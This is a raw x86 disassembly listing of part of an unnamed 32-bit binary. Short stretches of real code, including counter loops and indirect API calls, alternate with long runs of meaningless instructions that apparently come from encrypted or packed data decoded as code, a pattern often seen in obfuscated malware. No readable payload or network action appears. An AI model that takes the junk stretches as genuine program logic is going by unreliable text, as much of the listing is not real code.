  405125:	mov    DWORD PTR ds:0x4337ff,edx
  40512b:	cmp    DWORD PTR ds:0x4337ff,0x17
  405132:	jae    0x40515a
  405138:	cmp    DWORD PTR ds:0x4337ff,0x18
  40513f:	jne    0x405155
  405145:	push   0x19d0
  40514a:	push   0x338d
  40514f:	call   DWORD PTR ds:0x412004
  405155:	jmp    0x40511c
  40515a:	mov    edx,DWORD PTR [ebp-0x4]
  40515d:	sbb    DWORD PTR ds:0x4337eb,0x43376f
  405167:	xor    edx,eax
  405169:	xor    DWORD PTR ds:0x4337e7,0x55d1
  405173:	jmp    0x4054cd
  405178:	cdq    
  405179:	jp     0x4051e8
  40517b:	pushf  
  40517c:	ins    DWORD PTR es:[edi],dx
  40517d:	imul   ebp,DWORD PTR [ecx+0x7b],0x879a2b7f
  405184:	loop   0x4051f2
  405186:	scas   al,BYTE PTR es:[edi]
  405187:	mov    ch,0xf4
  405189:	sub    BYTE PTR [esi+0x7e],bh
  40518c:	xor    edi,DWORD PTR [ebp+0x7e]
  40518f:	jle    0x4051da
  405191:	push   0xffffffd4
  405193:	iret   
  405194:	dec    edx
  405195:	jne    0x405146
  405197:	(bad)  
  405198:	jb     0x405175
  40519a:	xchg   ecx,eax
  40519b:	(bad)  
  40519c:	dec    DWORD PTR [ecx+0x232b38aa]
  4051a2:	popf   
  4051a3:	dec    esp
  4051a4:	xchg   ebp,eax
  4051a5:	add    DWORD PTR es:[eax+ecx*8+0x50],ebp
  4051aa:	je     0x4051ca
  4051ac:	rol    DWORD PTR [edx],1
  4051ae:	cdq    
  4051af:	not    ebx
  4051b1:	pushf  
  4051b2:	es stos DWORD PTR es:[edi],eax
  4051b4:	pop    ebp
  4051b5:	cli    
  4051b6:	cs dec esp
  4051b8:	lds    ecx,FWORD PTR [ebp+0x2d]
  4051bb:	sub    BYTE PTR [ebx-0x5b],ch
  4051be:	inc    ecx
  4051bf:	inc    eax
  4051c0:	dec    ebp
  4051c1:	les    ecx,FWORD PTR [ecx-0x5c7bc2fd]
  4051c7:	shr    DWORD PTR [eax],0x5b
  4051ca:	sub    ebp,ebp
  4051cc:	pop    ss
  4051cd:	lods   al,BYTE PTR ds:[esi]
  4051ce:	retf   0xcc78
  4051d1:	mov    dh,0x56
  4051d3:	or     BYTE PTR [ecx-0x7c82430e],ch
  4051d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051da:	xchg   esp,eax
  4051db:	scas   al,BYTE PTR es:[edi]
  4051dc:	xchg   ebp,eax
  4051dd:	inc    edi
  4051de:	xchg   esp,eax
  4051df:	ss pop ebp
  4051e1:	cld    
  4051e2:	ss jo  0x405166
  4051e5:	sbb    DWORD PTR [ebp+0x3d],esi
  4051e8:	das    
  4051e9:	or     ebx,DWORD PTR [edi-0x7f]
  4051ec:	jnp    0x405175
  4051ee:	mov    dl,0x2f
  4051f0:	(bad)  
  4051f2:	sub    edx,DWORD PTR [ecx+0x67c8a291]
  4051f8:	jo     0x405205
  4051fa:	and    al,0x7b
  4051fc:	not    DWORD PTR [edx]
  4051fe:	and    DWORD PTR [esi+0x65bae393],edi
  405204:	pop    es
  405205:	(bad)  
  405206:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405207:	xchg   edi,ebp
  405209:	loopne 0x4051fd
  40520b:	pop    ebx
  40520c:	mov    WORD PTR [esi-0x1c],es
  40520f:	shl    DWORD PTR [eax-0x3ef5d7f3],1
  405215:	add    eax,0x7870c35b
  40521a:	or     BYTE PTR [edi],bl
  40521c:	sbb    eax,0x4a97c341
  405221:	add    al,0x49
  405223:	or     esp,ebp
  405225:	aas    
  405226:	(bad)  
  405227:	dec    eax
  405228:	call   0x9a4ed7d3
  40522d:	adc    ecx,DWORD PTR [ebp+0x545cf8c5]
  405233:	popa   
  405234:	cld    
  405235:	cli    
  405236:	ret    0xbb73
  405239:	mov    dl,0xa8
  40523b:	out    0x68,al
  40523d:	push   cs
  40523e:	add    al,0xbf
  405240:	inc    ecx
  405241:	addr16 jae 0x405200
  405244:	addr16 mov ss:0xa1e,al
  405249:	adc    DWORD PTR ds:0xcaf98483,esi
  40524f:	ffree  st(1)
  405251:	jecxz  0x4052c7
  405253:	dec    ebp
  405254:	pop    esp
  405255:	lds    edi,FWORD PTR gs:[esi-0x396c48aa]
  40525c:	xor    eax,0x9f511edf
  405261:	inc    ebx
  405262:	inc    esp
  405263:	(bad)  [edx]
  405265:	inc    esp
  405266:	push   edi
  405267:	popa   
  405268:	nop
  405269:	bound  eax,QWORD PTR [ebp-0x13]
  40526c:	hlt    
  40526d:	push   ebp
  40526e:	sbb    DWORD PTR [ecx],ebx
  405270:	cmp    DWORD PTR [ebx+0x6f],0xb1a5335
  405277:	popa   
  405278:	sti    
  405279:	ja     0x4051fb
  40527b:	int3   
  40527c:	(bad)  
  40527d:	fisub  WORD PTR [eax+ecx*1]
  405280:	push   esi
  405281:	dec    ebx
  405282:	call   FWORD PTR [edx+ebx*8]
  405285:	retf   0xc0e0
  405288:	ret    
  405289:	adc    al,0x37
  40528b:	arpl   di,si
  40528d:	push   0x4d6fe93
  405292:	out    0xda,eax
  405294:	push   edx
  405295:	repz scas al,BYTE PTR es:[edi]
  405297:	xchg   DWORD PTR [esi+0x66],esi
  40529a:	mov    dh,0x33
  40529c:	mov    ch,0x2c
  40529e:	fsub   QWORD PTR [eax+eiz*1]
  4052a1:	cli    
  4052a2:	jmp    0xa07a:0x55745bbb
  4052a9:	push   0x2931dcb
  4052ae:	push   ecx
  4052af:	cmp    BYTE PTR [edi-0x4940cce0],bl
  4052b5:	popf   
  4052b6:	ins    DWORD PTR es:[edi],dx
  4052b7:	je     0x405322
  4052b9:	fild   DWORD PTR [edx+0x4a1d5cdc]
  4052bf:	lods   eax,DWORD PTR ds:[esi]
  4052c0:	mov    bh,0x59
  4052c2:	dec    ecx
  4052c3:	xlat   BYTE PTR ds:[ebx]
  4052c4:	mov    gs,eax
  4052c6:	repz jno 0x405299
  4052c9:	xor    al,0x45
  4052cb:	mov    DWORD PTR [edx+0x70680e01],ecx
  4052d1:	xlat   BYTE PTR ds:[ebx]
  4052d2:	adc    eax,ebp
  4052d4:	mov    ds:0x7ff1f53e,eax
  4052d9:	js     0x405353
  4052db:	dec    ecx
  4052dc:	aaa    
  4052dd:	rcl    DWORD PTR [ecx],0x93
  4052e0:	push   edi
  4052e1:	retf   
  4052e2:	hlt    
  4052e3:	mov    bl,BYTE PTR ds:0xdc3d21a9
  4052e9:	icebp  
  4052ea:	retf   0x353e
  4052ed:	outs   dx,BYTE PTR ds:[esi]
  4052ee:	in     eax,0x29
  4052f0:	inc    ebx
  4052f1:	mov    al,0xc5
  4052f3:	stos   BYTE PTR es:[edi],al
  4052f4:	cmc    
  4052f5:	loopne 0x405365
  4052f7:	jg     0x40530d
  4052f9:	mov    BYTE PTR [ebp+0x18],bl
  4052fc:	mov    al,ds:0xedbe6796
  405301:	ss call 0xd06d9f94
  405307:	call   0xf939f84d
  40530c:	dec    edi
  40530d:	aas    
  40530e:	pushf  
  40530f:	retf   
  405310:	aad    0xbd
  405312:	cs popf 
  405314:	push   0x66
  405316:	ror    BYTE PTR [esi+0x2b],cl
  405319:	add    al,0x41
  40531b:	dec    eax
  40531c:	sub    al,0x96
  40531e:	push   0x27
  405320:	mov    eax,ds:0x47a05eea
  405325:	mov    edx,0x39011b6a
  40532a:	sub    ebp,eax
  40532c:	cmc    
  40532d:	ins    DWORD PTR es:[edi],dx
  40532e:	gs in  al,0x55
  405331:	xchg   edx,eax
  405332:	les    edi,FWORD PTR [eax+0x39719206]
  405338:	push   ecx
  405339:	sbb    BYTE PTR [esi+0x52db3906],dl
  40533f:	jecxz  0x4052ce
  405341:	jecxz  0x405350
  405343:	and    al,0x4c
  405345:	cmp    al,0x2d
  405347:	dec    eax
  405348:	aad    0xf6
  40534a:	pop    ds
  40534b:	jg     0x405327
  40534d:	cmp    DWORD PTR ds:0x9cf95b97,edx
  405353:	dec    edi
  405354:	inc    ebp
  405355:	or     ch,0x5f
  405358:	enter  0x904e,0x9b
  40535c:	adc    ecx,DWORD PTR [edx+0x93d6f70]
  405362:	pop    edi
  405363:	xchg   ecx,eax
  405364:	mov    DWORD PTR [esi+ecx*4],0x5715aeaa
  40536b:	pop    es
  40536c:	mov    cl,0x7a
  40536e:	ffree  st(3)
  405370:	sub    ebx,DWORD PTR [ecx+0x34]
  405373:	xchg   DWORD PTR [ecx+esi*2],esp
  405376:	sbb    eax,0x27cc72a3
  40537b:	(bad)  
  40537c:	push   edi
  40537d:	mov    dh,0xc8
  40537f:	adc    al,BYTE PTR [edi]
  405381:	cmp    ebp,ebp
  405383:	xor    DWORD PTR [edx+0x626bb0b7],ebx
  405389:	into   
  40538a:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40538c:	cmp    eax,DWORD PTR [ebx]
  40538e:	repnz fdivr st(5),st
  405392:	or     BYTE PTR [esp+eax*4-0x2b4f4fa4],cl
  405399:	push   esp
  40539a:	or     eax,0x513d13fd
  40539f:	sbb    BYTE PTR [esi+0x17],0x87
  4053a3:	sub    edx,DWORD PTR [ebp-0x613e7dc0]
  4053a9:	push   eax
  4053aa:	push   esp
  4053ab:	mov    ?,WORD PTR [edx]
  4053ad:	fwait
  4053ae:	jns    0x4053a0
  4053b0:	xchg   esp,eax
  4053b1:	mov    al,ds:0x5a655d6a
  4053b6:	sub    cl,dh
  4053b8:	retf   0x7e4b
  4053bb:	pushf  
  4053bc:	adc    dl,0xde
  4053bf:	pusha  
  4053c0:	push   esi
  4053c1:	or     BYTE PTR [esi+0x3d],bh
  4053c4:	dec    esp
  4053c5:	retf   0x6491
  4053c8:	xchg   edi,eax
  4053c9:	push   es
  4053ca:	mov    ecx,0x52adf210
  4053cf:	sbb    eax,DWORD PTR [edx-0x521a7170]
  4053d5:	add    BYTE PTR [edx],cl
  4053d7:	les    edx,FWORD PTR [ebx]
  4053d9:	mov    ds:0x20f4eaac,al
  4053de:	jle    0x405429
  4053e0:	mov    WORD PTR [eax+0x53],gs
  4053e3:	rcl    cl,1
  4053e5:	std    
  4053e6:	out    0x33,al
  4053e8:	jmp    0x4053bb
  4053ea:	fiadd  WORD PTR [ebx-0x5]
  4053ed:	xchg   edx,eax
  4053ee:	xor    BYTE PTR [eax-0x71d398fd],ah
  4053f4:	adc    al,0xee
  4053f6:	cli    
  4053f7:	repnz aad 0x22
  4053fa:	cwde   
  4053fb:	mov    edx,0xa3a14fdd
  405400:	mov    esp,0xd6f9cd26
  405405:	adc    eax,0x8b74ac3f
  40540a:	enter  0xc22a,0x76
  40540e:	jecxz  0x4053d3
  405410:	add    DWORD PTR [eax-0xc],esi
  405413:	mov    dl,0xaa
  405415:	icebp  
  405416:	pop    eax
  405417:	jae    0x405447
  405419:	push   ss
  40541a:	inc    ebp
  40541b:	outs   dx,BYTE PTR ds:[esi]
  40541c:	test   eax,0xe55ca4f5
  405421:	popf   
  405422:	dec    ebp
  405423:	add    eax,0xd5491d27
  405428:	add    eax,0xa99c5073
  40542d:	je     0x4053c1
  40542f:	idiv   DWORD PTR [ebx+0xd3805ef]
  405435:	cmp    BYTE PTR [ebp-0x1f9f8887],bh
  40543b:	ret    0xf59f
  40543e:	jmp    0x7d27:0x6c20187e
  405445:	cwde   
  405446:	(bad)  
  405447:	sbb    dh,BYTE PTR [ebp+0x491159fa]
  40544d:	aas    
  40544e:	inc    edi
  40544f:	(bad)  
  405450:	adc    BYTE PTR [ecx-0x5],cl
  405453:	mov    ah,0x4f
  405455:	xor    dh,BYTE PTR [eax]
  405457:	adc    dh,BYTE PTR [edi-0x40b841f7]
  40545d:	lods   eax,DWORD PTR ds:[esi]
  40545e:	fsubr  QWORD PTR fs:[ebx+0x31fa22d0]
  405465:	push   ss
  405466:	cmp    ebx,DWORD PTR [ecx-0x38]
  405469:	sub    edx,edi
  40546b:	(bad)  
  40546c:	mov    DWORD PTR [ecx-0x3d60d1ee],0x57bc6b48
  405476:	gs (bad) 
  405478:	xor    al,BYTE PTR [ecx+0x3f]
  40547b:	cwde   
  40547c:	aas    
  40547d:	outs   dx,DWORD PTR ds:[esi]
  40547e:	les    ebp,FWORD PTR [eax]
  405480:	fistp  WORD PTR [eax-0x3]
  405483:	mov    bl,0x64
  405485:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405486:	scas   eax,DWORD PTR es:[edi]
  405487:	jmp    0x4054ba
  405489:	imul   edx,edi,0xffffffaa
  40548c:	jmp    0x4054eb
  40548e:	jne    0x4054da
  405490:	cmp    DWORD PTR [esi-0x51],0xffffffd8
  405494:	jg     0x405503
  405496:	xor    eax,0xa6e2c514
  40549b:	mov    dh,0x9c
  40549d:	gs ret 
  40549f:	jne    0x40543e
  4054a1:	ds xor eax,0x48065d5e
  4054a7:	sahf   
  4054a8:	loope  0x40551b
  4054aa:	ficomp DWORD PTR [esi]
  4054ac:	jns    0x40543a
  4054ae:	jb     0x4054c5
  4054b0:	lods   al,BYTE PTR ds:[esi]
  4054b1:	(bad)  
  4054b2:	scas   al,BYTE PTR es:[edi]
  4054b3:	out    dx,al
  4054b4:	fsubr  st(7),st
  4054b6:	(bad)
  4054ba:	push   eax
  4054bb:	lock push 0x8766ab51
  4054c1:	inc    ecx
  4054c2:	iret   
  4054c3:	or     bh,BYTE PTR [ebp-0x4b]
  4054c6:	out    0xeb,eax
  4054c8:	jg     0x40551d
  4054ca:	pop    ss
  4054cb:	icebp  
  4054cc:	fadd   QWORD PTR [ebx]
  4054ce:	shr    ecx,1
  4054d0:	push   ss
  4054d1:	sldt   WORD PTR [eax]
  4054d4:	mov    edx,DWORD PTR [ebp-0x2c]
  4054d7:	mov    edi,DWORD PTR [ebp-0x4]
  4054da:	xor    edx,eax
  4054dc:	movzx  ebx,BYTE PTR ds:0x4337e7
  4054e3:	or     DWORD PTR ds:0x433803,ebx
  4054e9:	xor    edi,eax
  4054eb:	and    DWORD PTR ds:0x4337f3,0x0
  4054f5:	xor    ebx,ebx
  4054f7:	add    ebx,DWORD PTR ds:0x4337f3
  4054fd:	inc    ebx
  4054fe:	mov    DWORD PTR ds:0x4337f3,ebx
  405504:	cmp    DWORD PTR ds:0x4337f3,0x6
  40550b:	jne    0x40552b
  405511:	push   0x1804
  405516:	push   0x80d8
  40551b:	push   0x74bc
  405520:	push   0x5a14
  405525:	call   DWORD PTR ds:0x412370
  40552b:	cmp    DWORD PTR ds:0x4337f3,0x5
  405532:	jne    0x405545
  405538:	mov    ebx,DWORD PTR ds:0x4337f3
  40553e:	inc    ebx
  40553f:	mov    DWORD PTR ds:0x4337f3,ebx
  405545:	cmp    DWORD PTR ds:0x4337f3,0x1e
  40554c:	jb     0x4054f5
  405552:	mov    DWORD PTR ds:0x4337f7,0x387c
  40555c:	add    edi,ecx
  40555e:	add    edx,ecx
  405560:	imul   edx,edi
  405563:	mov    edi,DWORD PTR [ebp-0x8]
  405566:	and    DWORD PTR ds:0x4337b7,0x0
  405570:	mov    ebx,DWORD PTR ds:0x4337b7
  405576:	inc    ebx
  405577:	mov    DWORD PTR ds:0x4337b7,ebx
  40557d:	cmp    DWORD PTR ds:0x4337b7,0x2c
  405584:	jne    0x4055b0
  40558a:	push   DWORD PTR [ebp-0x28]
  40558d:	push   0x7933
  405592:	push   0x433946
  405597:	push   DWORD PTR [ebp-0x28]
  40559a:	push   DWORD PTR [ebp-0x24]
  40559d:	push   DWORD PTR [ebp-0x1c]
  4055a0:	push   0x42e0
  4055a5:	push   0x392f
  4055aa:	call   DWORD PTR ds:0x412374
  4055b0:	cmp    DWORD PTR ds:0x4337b7,0x1e
  4055b7:	jb     0x405570
  4055bd:	mov    ebx,DWORD PTR [ebp-0x10]
  4055c0:	sub    ebx,edi
  4055c2:	cmp    ebx,edx
  4055c4:	ja     0x4055d2
  4055ca:	mov    edx,DWORD PTR [ebp-0x28]
  4055cd:	jmp    0x4063dc
  4055d2:	mov    edx,DWORD PTR [ebp-0x30]
  4055d5:	mov    edi,DWORD PTR [ebp-0x4]
  4055d8:	xor    edx,eax
  4055da:	xor    edi,eax
  4055dc:	add    edi,ecx
  4055de:	add    edx,ecx
  4055e0:	imul   edx,edi
  4055e3:	mov    edi,DWORD PTR [ebp-0x8]
  4055e6:	mov    ebx,DWORD PTR [ebp-0x10]
  4055e9:	sub    ebx,edi
  4055eb:	cmp    ebx,edx
  4055ed:	ja     0x4055fb
  4055f3:	mov    edx,DWORD PTR [ebp-0x2c]
  4055f6:	jmp    0x4063dc
  4055fb:	mov    edx,DWORD PTR [ebp-0x34]
  4055fe:	mov    edi,DWORD PTR [ebp-0x4]
  405601:	xor    edx,eax
  405603:	xor    edi,eax
  405605:	add    edi,ecx
  405607:	add    edx,ecx
  405609:	imul   edx,edi
  40560c:	mov    edi,DWORD PTR [ebp-0x8]
  40560f:	mov    ebx,DWORD PTR [ebp-0x10]
  405612:	sub    ebx,edi
  405614:	cmp    ebx,edx
  405616:	ja     0x40597e
  40561c:	jmp    0x405976
  405621:	(bad)  [eax+0x65]
  405624:	pop    eax
  405625:	jne    0x405698
  405627:	loope  0x405672
  405629:	clc    
  40562a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40562b:	dec    ebp
  40562c:	push   0x8ecea4d8
  405631:	test   eax,0x337e7e37
  405636:	jge    0x4056b6
  405638:	jle    0x4055d3
  40563a:	jg     0x4055f0
  40563c:	sbb    al,0x7
  40563e:	pusha  
  40563f:	mov    al,BYTE PTR [edi-0x29]
  405642:	js     0x405669
  405644:	xor    DWORD PTR [ecx],edx
  405646:	pop    edi
  405647:	lods   eax,DWORD PTR ds:[esi]
  405648:	aas    
  405649:	xchg   BYTE PTR [eax],dl
  40564b:	hlt    
  40564c:	push   0xffffffc7
  40564e:	ds fucomi st,st(6)
  405651:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405652:	push   ds
  405653:	adc    BYTE PTR [eax+0x5b],0xd1
  405657:	xchg   DWORD PTR [esi],edx
  405659:	mov    al,0x63
  40565b:	sub    cl,BYTE PTR [ebx+ecx*8-0x4a]
  40565f:	sbb    eax,DWORD PTR [edx]
  405661:	ret    
  405662:	jbe    0x405633
  405664:	stc    
  405665:	mov    esi,0x22d2f80c
  40566a:	lods   al,BYTE PTR ds:[esi]
  40566b:	cmp    bh,dh
  40566d:	jp     0x4056b0
  40566f:	jo     0x405643
  405671:	test   esi,edi
  405673:	int    0x18
  405675:	add    DWORD PTR [esi+esi*2-0x7c],esi
  405679:	or     DWORD PTR [edi+0x62],esp
  40567c:	(bad)  
  40567e:	(bad)  
  40567f:	mov    eax,0x2d76400c
  405684:	scas   al,BYTE PTR es:[edi]
  405685:	mov    esi,0xe5ad1575
  40568a:	push   ds
  40568b:	loop   0x4056b7
  40568d:	jecxz  0x405680
  40568f:	es add ebp,ebx
  405692:	retf   
  405693:	sbb    al,0x49
  405695:	xor    eax,0xaf03dd49
  40569a:	or     ecx,DWORD PTR [edx+edi*8]
  40569d:	fwait
  40569e:	jae    0x405710
  4056a0:	sar    DWORD PTR [eax],1
  4056a2:	add    ebx,DWORD PTR [ebp+0x59edadec]
  4056a8:	call   0x243a
  4056ad:	cli    
  4056ae:	inc    eax
  4056af:	(bad)  
  4056b0:	or     eax,0x95c092d4
  4056b5:	mov    cl,0xc6
  4056b7:	cli    
  4056b8:	test   eax,0x8cab16f2
  4056bd:	ins    BYTE PTR es:[edi],dx
  4056be:	dec    edx
  4056bf:	push   esp
  4056c0:	jns    0x405686
  4056c2:	dec    edx
  4056c3:	pop    ebp
  4056c4:	xor    al,0x84
  4056c6:	lds    esi,FWORD PTR [ebx-0x5ebb08a]
  4056cc:	out    0xaa,al
  4056ce:	arpl   WORD PTR [esi],bx
  4056d0:	pop    ds
  4056d1:	xchg   esi,eax
  4056d2:	cmp    eax,0x5c8faab
  4056d7:	outs   dx,DWORD PTR ds:[esi]
  4056d8:	test   al,0xba
  4056da:	xchg   ebp,eax
  4056db:	pusha  
  4056dc:	lea    ebp,[ecx]
  4056de:	push   di
  4056e0:	fbstp  TBYTE PTR [eax+0x44]
  4056e3:	cmp    ebx,ebx
  4056e5:	imul   edi,DWORD PTR [esi],0x1b25c047
  4056eb:	push   eax
  4056ec:	lds    edx,FWORD PTR [esp+eax*2+0x69]
  4056f0:	pusha  
  4056f1:	or     edx,ebp
  4056f3:	xchg   ebx,eax
  4056f4:	outs   dx,BYTE PTR ds:[esi]
  4056f5:	pushf  
  4056f6:	repz jl 0x405743
  4056f9:	and    BYTE PTR [ecx-0x3f2cbfa7],ah
  4056ff:	sbb    bl,BYTE PTR [ebx+ebx*8]
  405702:	outs   dx,DWORD PTR ds:[esi]
  405703:	stos   DWORD PTR es:[edi],eax
  405704:	imul   esp,DWORD PTR [ecx+0x4c],0x8ccf3418
  40570b:	jae    0x4056b7
  40570d:	push   edx
  40570e:	stos   DWORD PTR es:[edi],eax
  40570f:	rol    BYTE PTR [ebx-0x4015b7e0],1
  405715:	jbe    0x4056aa
  405717:	call   0x7245:0x7ae08ecb
  40571e:	jg     0x40579a
  405720:	push   ds
  405721:	icebp  
  405722:	lods   eax,DWORD PTR ds:[esi]
  405723:	into   
  405724:	mov    WORD PTR [ebx],?
  405726:	push   0xddc9c860
  40572b:	jp     0x4057a2
  40572d:	fisub  DWORD PTR [ebx+0x2b41d36e]
  405733:	jnp    0x4056e1
  405735:	or     al,0x74
  405737:	cld    
  405738:	dec    eax
  405739:	push   es
  40573a:	pop    ecx
  40573b:	sbb    edx,edi
  40573d:	mov    ebx,DWORD PTR [ebp-0x34]
  405740:	or     ah,BYTE PTR [ebp-0x33]
  405743:	push   0xf7be710c
  405748:	xchg   esp,eax
  405749:	mov    ch,0xf3
  40574b:	xchg   BYTE PTR [ebp+0x31f1067],cl
  405751:	dec    ebp
  405752:	call   0x7d04:0xb2bbcb3a
  405759:	or     DWORD PTR [edx],edx
  40575b:	push   es
  40575c:	retf   0x115f
  40575f:	push   ebx
  405760:	addr16 mov edx,0xc1f5909e
  405766:	ret    0x2239
  405769:	jp     0x405700
  40576b:	cmp    al,0x3b
  40576d:	xchg   ecx,eax
  40576e:	adc    BYTE PTR [eax],cl
  405770:	sti    
  405771:	repnz and bl,dh
  405774:	and    dh,ah
  405776:	dec    esp
  405777:	and    al,0x4
  405779:	aam    0x6c
  40577b:	push   ebp
  40577c:	adc    BYTE PTR [esi-0xc],dl
  40577f:	in     al,0xaa
  405781:	adc    BYTE PTR [edx+0x4],bl
  405784:	or     eax,0x442d6c74
  405789:	cmp    bh,BYTE PTR [esi-0x19]
  40578c:	loop   0x4057de
  40578e:	jo     0x4057a7
  405790:	out    0x52,eax
  405792:	das    
  405793:	pusha  
  405794:	adc    DWORD PTR [ecx],esi
  405796:	adc    edi,ebx
  405798:	mov    esi,0x9d2e5a4e
  40579d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40579e:	jmp    0x2b3e22e5
  4057a3:	xor    BYTE PTR [ecx],0xfd
  4057a6:	jbe    0x405769
  4057a8:	into   
  4057a9:	mov    esi,DWORD PTR [ebx+0xfd6fd2d]
  4057af:	push   esi
  4057b0:	xor    al,BYTE PTR [eax]
  4057b2:	pop    ecx
  4057b3:	pushf  
  4057b4:	ins    BYTE PTR es:[edi],dx
  4057b5:	or     DWORD PTR [ebx],eax
  4057b7:	sbb    dl,dh
  4057b9:	jae    0x4057c3
  4057bb:	or     al,0xa7
  4057bd:	ret    0xf55a
  4057c0:	in     eax,dx
  4057c1:	repz push esi
  4057c3:	jb     0x4057da
  4057c5:	mov    edi,0x377f001f
  4057ca:	add    al,0xea
  4057cc:	lds    esi,FWORD PTR [eax]
  4057ce:	test   DWORD PTR [esp+esi*1+0x65],eax
  4057d2:	ins    DWORD PTR es:[edi],dx
  4057d3:	mov    esi,0xd3e40a38
  4057d8:	std    
  4057d9:	add    BYTE PTR [ebx+0x74],0xd6
  4057dd:	jmp    0x405805
  4057df:	repz and ecx,esi
  4057e2:	in     al,0x6a
  4057e4:	leave  
  4057e5:	sub    al,0x61
  4057e7:	retf   
  4057e8:	mov    ds:0x2635bdbe,al
  4057ed:	cmp    BYTE PTR [eax+esi*1+0x358b4aa9],dl
  4057f4:	mov    ch,0x1e
  4057f6:	xchg   ecx,eax
  4057f7:	ins    BYTE PTR es:[edi],dx
  4057f8:	inc    ebp
  4057f9:	imul   edx,edi,0x16e4daff
  4057ff:	retf   0xb82b
  405802:	in     eax,dx
  405803:	jne    0x4057e8
  405805:	aaa    
  405806:	sub    DWORD PTR [edi+ebx*4],esp
  405809:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40580a:	mov    eax,ds:0xc1ad8cdf
  40580f:	cmp    al,0xc7
  405811:	mov    dh,0x14
  405813:	out    dx,al
  405814:	addr16 sbb eax,0x7c2458f7
  40581a:	jmp    0x87dc03d0
  40581f:	pop    es
  405820:	je     0x4057aa
  405822:	sbb    BYTE PTR ds:0xd6680246,al
  405828:	shl    ebx,0x83
  40582b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40582c:	add    ah,BYTE PTR [esi+0x26]
  40582f:	inc    esi
  405830:	fwait
  405831:	push   esp
  405832:	or     al,0xec
  405834:	sub    BYTE PTR [esi-0x18],bl
  405837:	inc    eax
  405838:	add    BYTE PTR [ebp-0x19d0163f],dh
  40583e:	std    
  40583f:	mov    esi,0xb7e0c68b
  405844:	xor    BYTE PTR [ecx-0x3fbb16dd],dh
  40584a:	mov    ah,ah
  40584c:	bound  edi,QWORD PTR [esp+ebp*4]
  40584f:	xchg   esp,eax
  405850:	pop    ebp
  405851:	daa    
  405852:	adc    eax,0x71eb9e98
  405857:	out    0xac,al
  405859:	daa    
  40585a:	or     BYTE PTR fs:[ebx],0x75
  40585e:	or     bh,BYTE PTR [esi-0x30022c94]
  405864:	popf   
  405865:	loopne 0x4057f5
  405867:	xor    DWORD PTR [eax+ebx*4+0x60],0x3c
  40586c:	in     al,dx
  40586d:	inc    ebp
  40586e:	mov    cl,0x5
  405870:	push   ebp
  405871:	sub    al,0xff
  405873:	mov    ds:0xdbeb8742,al
  405878:	and    eax,0xdec1f6fb
  40587d:	xor    al,0x1d
  40587f:	(bad)  
  405880:	cmp    al,0xb1
  405882:	pop    eax
  405883:	loop   0x4058cb
  405885:	xchg   esp,eax
  405886:	popa   
  405887:	cdq    
  405888:	leave  
  405889:	xchg   ebp,eax
  40588a:	test   eax,0xbcb2fa29
  40588f:	call   0xecb5426d
  405894:	cmc    
  405895:	sbb    bh,bh
  405897:	fxch   st(7)
  405899:	in     al,0x56
  40589b:	mov    bl,0x82
  40589d:	mov    dh,0x6e
  40589f:	xchg   esp,eax
  4058a0:	aam    0x89
  4058a2:	push   ss
  4058a3:	in     al,dx
  4058a4:	xor    al,0xa2
  4058a6:	sub    DWORD PTR [esi],0x19
  4058a9:	inc    DWORD PTR [esp+edi*4+0x5a]
  4058ad:	mov    bh,0x12
  4058af:	jg     0x405925
  4058b1:	jle    0x405897
  4058b3:	jns    0x40584a
  4058b5:	imul   edi,DWORD PTR [esi+0x22],0xdb7be637
  4058bc:	scas   eax,DWORD PTR es:[edi]
  4058bd:	das    
  4058be:	ja     0x40592a
  4058c0:	aaa    
  4058c1:	pop    esi
  4058c2:	mov    bl,0xee
  4058c4:	dec    ebp
  4058c5:	adc    edx,DWORD PTR [ebp-0x7a635df9]
  4058cb:	pop    edx
  4058cc:	jnp    0x4058d4
  4058ce:	sub    BYTE PTR [edx-0x83d5d23],cl
  4058d4:	pop    eax
  4058d5:	leave  
  4058d6:	and    ah,dh
  4058d8:	sbb    ch,ch
  4058da:	stos   BYTE PTR es:[edi],al
  4058db:	mov    DWORD PTR [esi-0x57],esp
  4058de:	inc    ebx
  4058df:	and    dl,BYTE PTR [ecx]
  4058e1:	mov    BYTE PTR [edx-0x3380b66e],ah
  4058e7:	mov    dl,0x16
  4058e9:	test   DWORD PTR [ecx-0x48e84705],ebx
  4058ef:	test   BYTE PTR [edx+0x7d59ea19],dl
  4058f5:	mov    ecx,0xf5b9aef5
  4058fa:	mov    DWORD PTR [ebp+0x5b2abee4],ebp
  405900:	in     al,dx
  405901:	add    edi,ebp
  405903:	mov    ?,ebx
  405905:	loop   0x40595f
  405907:	fldcw  WORD PTR [edx+0x717485bd]
  40590d:	cmc    
  40590e:	mov    ah,0x6f
  405910:	fsubr  st,st(6)
  405912:	mov    dl,BYTE PTR [ebp-0x27]
  405915:	mov    edx,DWORD PTR [edi+0x2d31b790]
  40591b:	sbb    DWORD PTR [eax+ebx*1],eax
  40591e:	enter  0x1177,0xd2
  405922:	mov    esi,0xa222fb4f
  405927:	dec    ecx
  405928:	das    
  405929:	xchg   esp,eax
  40592a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40592b:	imul   esi,DWORD PTR [ebp-0x1d],0x32
  40592f:	iret   
  405930:	push   edi
  405931:	inc    esi
  405932:	mov    dl,0xdd
  405934:	lea    edi,[ecx+0x6e22219f]
  40593a:	popf   
  40593b:	add    eax,0x8098fcd7
  405940:	test   DWORD PTR [ebp-0x1e],0x2ba63e88
  405947:	fdivr  QWORD PTR [edi]
  405949:	push   cs
  40594a:	cdq    
  40594b:	int3   
  40594c:	mov    es,WORD PTR [ecx+0x12]
  40594f:	daa    
  405950:	adc    DWORD PTR [ebp-0x7f78eb72],edx
  405956:	or     ecx,DWORD PTR [ebx-0x12]
  405959:	ins    BYTE PTR es:[edi],dx
  40595a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40595b:	jmp    0x40594c
  40595d:	adc    al,0x81
  40595f:	je     0x405975
  405961:	dec    esp
  405962:	loope  0x40591b
  405964:	push   cs
  405965:	(bad)  
